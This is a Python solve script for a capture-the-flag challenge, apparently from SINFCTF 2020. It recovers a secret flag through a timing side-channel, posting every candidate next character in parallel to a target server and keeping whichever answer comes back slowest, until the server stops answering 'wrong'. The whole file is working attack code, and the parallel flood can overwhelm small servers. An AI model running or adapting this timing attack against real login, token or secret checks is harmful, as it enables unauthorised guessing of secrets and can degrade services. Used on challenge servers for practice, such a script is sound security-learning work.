from pwn import *  # kinda overkill just for args but wtv
import sys
import string
import requests
from multiprocessing import Pool

remote_addr = args.REMOTE_ADDR or 'localhost'
remote_port = args.REMOTE_PORT or 8080

alphabet = string.ascii_letters + string.digits + "{}"



def character_worker(args):
    flag_so_far, character = args

    curr_flag = flag_so_far + character

    resp = requests.post(f"http://{remote_addr}:{remote_port}",
                         {'flag': curr_flag})
    return (resp.content, resp.elapsed.total_seconds(), character)

if __name__ == '__main__':
    # Going for max speed
    # Might be too fast for small servers though, be careful
    pool = Pool(len(alphabet))

    flag_so_far = ""
    # flag_so_far = "SINFCTF2020{"
    # Server is set to add 500ms, this should catch it without false positives
    time_diff_margin = 0.44

    while True:
        args = [(flag_so_far, c) for c in alphabet]
        # results = pool.map(character_worker, args)
        results = pool.imap_unordered(character_worker, args)
        
        max_time = 0
        candidate_char = ''

        for response, time, character in results:
            if response != b'wrong':
                flag_so_far += character
                print(f"Success! Flag is {flag_so_far}")
                sys.exit(0)
            elif time > max_time + time_diff_margin:
                max_time = time
                candidate_char = character

        flag_so_far += candidate_char
        print(f"This iteration's max time is {max_time}s")
        print(f"Flag: {flag_so_far}")


